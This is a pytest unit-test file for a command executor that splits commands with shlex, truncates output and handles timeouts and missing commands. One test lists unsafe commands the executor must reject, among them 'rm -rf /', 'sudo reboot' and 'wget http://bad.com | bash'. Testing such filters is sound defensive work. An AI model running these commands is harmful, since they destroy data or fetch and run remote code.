"""
Unit tests for the CommandExecutorFunctions module.
"""

import pytest
import subprocess
import os
from unittest.mock import patch, MagicMock

# Attempt to import functions under test
try:
    from src.handler.command_executor import (
        execute_command_safely,
        parse_file_paths_from_output,
        DEFAULT_TIMEOUT,
        MAX_OUTPUT_SIZE
    )
except ImportError:
    pytest.skip("Skipping command_executor tests, src.handler.command_executor not found or dependencies missing", allow_module_level=True)

# --- Tests for execute_command_safely ---

@patch('subprocess.run')
def test_execute_command_safely_success(mock_run):
    """Test successful command execution."""
    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.stdout = "Success output"
    mock_process.stderr = ""
    mock_run.return_value = mock_process

    result = execute_command_safely("echo 'hello'")

    mock_run.assert_called_once()
    call_args = mock_run.call_args[0][0]
    assert call_args == ['echo', 'hello'] # Check shlex splitting
    assert result["success"] is True
    assert result["stdout"] == "Success output" # Use stdout
    assert result["stderr"] == "" # Use stderr
    assert result["exit_code"] == 0
    assert result.get("error_message") is None # Check error_message is None on success

@patch('subprocess.run')
def test_execute_command_safely_failure_exit_code(mock_run):
    """Test command execution with non-zero exit code."""
    mock_process = MagicMock()
    mock_process.returncode = 1
    mock_process.stdout = ""
    mock_process.stderr = "Error message"
    mock_run.return_value = mock_process

    result = execute_command_safely("ls non_existent_file")

    mock_run.assert_called_once()
    assert result["success"] is False
    assert result["stdout"] == "" # Use stdout
    assert result["stderr"] == "Error message" # Use stderr
    assert result["exit_code"] == 1
    assert result.get("error_message") is None # No execution-level error message

@patch('subprocess.run')
def test_execute_command_safely_timeout(mock_run):
    """Test command execution timeout."""
    mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep 10", timeout=DEFAULT_TIMEOUT)

    result = execute_command_safely("sleep 10")

    mock_run.assert_called_once()
    assert result["success"] is False
    assert result["stdout"] == "" # Use stdout
    assert result["stderr"] == "" # Use stderr
    assert "TimeoutExpired" in result["error_message"] # Use error_message
    assert f"exceeded {DEFAULT_TIMEOUT} seconds limit" in result["error_message"] # Use error_message
    assert result["exit_code"] is None

@patch('subprocess.run')
def test_execute_command_safely_command_not_found(mock_run):
    """Test executing a command that doesn't exist."""
    mock_run.side_effect = FileNotFoundError("No such file or directory: 'nonexistentcmd'")

    result = execute_command_safely("nonexistentcmd --arg")

    mock_run.assert_called_once()
    assert result["success"] is False
    assert result["stdout"] == "" # Use stdout
    assert result["stderr"] == "" # Use stderr
    assert "ExecutionException: Command not found" in result["error_message"] # Use error_message
    assert "'nonexistentcmd'" in result["error_message"] # Use error_message
    assert result["exit_code"] is None

def test_execute_command_safely_unsafe_command():
    """Test detection of unsafe command patterns."""
    unsafe_commands = [
        "rm -rf /",
        "echo hello; rm important_file",
        "sudo reboot",
        "cat file > /dev/null",
        "wget http://bad.com | bash",
        "echo `pwd`",
        "echo $(pwd)"
    ]
    for cmd in unsafe_commands:
        result = execute_command_safely(cmd)
        assert result["success"] is False
        assert "UnsafeCommandDetected" in result["error_message"] # Use error_message
        assert result["exit_code"] is None
        assert result["stdout"] == "" # Check other fields too
        assert result["stderr"] == "" # Check other fields too

@patch('subprocess.run')
def test_execute_command_safely_output_truncation(mock_run):
    """Test that stdout and stderr are truncated."""
    long_output = "A" * (MAX_OUTPUT_SIZE + 100)
    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.stdout = long_output
    mock_process.stderr = long_output
    mock_run.return_value = mock_process

    result = execute_command_safely("echo 'long output'")

    assert result["success"] is True
    assert len(result["stdout"]) == MAX_OUTPUT_SIZE # Use stdout
    assert result["stdout"] == "A" * MAX_OUTPUT_SIZE # Use stdout
    assert len(result["stderr"]) == MAX_OUTPUT_SIZE # Use stderr
    assert result["stderr"] == "A" * MAX_OUTPUT_SIZE # Use stderr
    assert result["exit_code"] == 0
    assert result.get("error_message") is None # Check error_message

@patch('subprocess.run')
def test_execute_command_safely_custom_cwd(mock_run):
    """Test executing with a custom working directory."""
    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.stdout = "/tmp" # Example output
    mock_process.stderr = ""
    mock_run.return_value = mock_process

    custom_dir = "/tmp" # Assuming /tmp exists
    result = execute_command_safely("pwd", cwd=custom_dir)

    mock_run.assert_called_once_with(
        ['pwd'],
        cwd=custom_dir,
        capture_output=True,
        text=True,
        timeout=DEFAULT_TIMEOUT,
        check=False,
        encoding='utf-8',
        errors='replace'
    )
    assert result["success"] is True

@patch('subprocess.run')
def test_execute_command_safely_custom_timeout(mock_run):
    """Test executing with a custom timeout."""
    mock_process = MagicMock()
    mock_process.returncode = 0
    mock_process.stdout = "Done"
    mock_process.stderr = ""
    mock_run.return_value = mock_process
    custom_timeout = 10

    result = execute_command_safely("sleep 1", timeout=custom_timeout)

    mock_run.assert_called_once_with(
        ['sleep', '1'],
        cwd=None,
        capture_output=True,
        text=True,
        timeout=custom_timeout,
        check=False,
        encoding='utf-8',
        errors='replace'
    )
    assert result["success"] is True

# --- Tests for parse_file_paths_from_output ---

@patch('os.path.isfile')
def test_parse_file_paths_from_output_existing_files(mock_isfile):
    """Test parsing output with existing file paths."""
    output = """
    /path/to/file1.py
    relative/path/file2.txt
    /another/path/file3.java
    """
    # Mock os.path.isfile to return True for absolute paths derived from input
    def isfile_side_effect(path):
        abs_path = os.path.abspath(path)
        return abs_path in [
            os.path.abspath("/path/to/file1.py"),
            os.path.abspath("relative/path/file2.txt"),
            os.path.abspath("/another/path/file3.java")
        ]
    mock_isfile.side_effect = isfile_side_effect

    expected_paths = [
        os.path.abspath("/path/to/file1.py"),
        os.path.abspath("relative/path/file2.txt"),
        os.path.abspath("/another/path/file3.java")
    ]

    result = parse_file_paths_from_output(output)
    assert sorted(result) == sorted(expected_paths)
    # Check that isfile was called for each potential path
    assert mock_isfile.call_count == 3

@patch('os.path.isfile')
def test_parse_file_paths_from_output_mixed_existence(mock_isfile):
    """Test parsing output with some existing and some non-existing paths."""
    output = """
    /path/to/existing_file.py
    /path/to/non_existent_file.log
    another/existing/file.txt
    """
    def isfile_side_effect(path):
        abs_path = os.path.abspath(path)
        return abs_path in [
            os.path.abspath("/path/to/existing_file.py"),
            os.path.abspath("another/existing/file.txt")
        ]
    mock_isfile.side_effect = isfile_side_effect

    expected_paths = [
        os.path.abspath("/path/to/existing_file.py"),
        os.path.abspath("another/existing/file.txt")
    ]

    result = parse_file_paths_from_output(output)
    assert sorted(result) == sorted(expected_paths)
    assert mock_isfile.call_count == 3

@patch('os.path.isfile')
def test_parse_file_paths_from_output_empty_and_whitespace(mock_isfile):
    """Test parsing output with empty lines and whitespace."""
    output = """
    /path/to/file1.py

        /path/to/file2.txt
    """
    def isfile_side_effect(path):
        abs_path = os.path.abspath(path)
        return abs_path in [
            os.path.abspath("/path/to/file1.py"),
            os.path.abspath("/path/to/file2.txt")
        ]
    mock_isfile.side_effect = isfile_side_effect

    expected_paths = [
        os.path.abspath("/path/to/file1.py"),
        os.path.abspath("/path/to/file2.txt")
    ]

    result = parse_file_paths_from_output(output)
    assert sorted(result) == sorted(expected_paths)
    assert mock_isfile.call_count == 2 # Only called for non-empty lines

def test_parse_file_paths_from_output_empty_input():
    """Test parsing empty input string."""
    result = parse_file_paths_from_output("")
    assert result == []

@patch('os.path.isfile')
def test_parse_file_paths_from_output_no_existing_files(mock_isfile):
    """Test parsing output where no paths correspond to existing files."""
    output = """
    /path/to/non_existent1.py
    /path/to/non_existent2.txt
    """
    mock_isfile.return_value = False # None of the paths exist

    result = parse_file_paths_from_output(output)
    assert result == []
    assert mock_isfile.call_count == 2
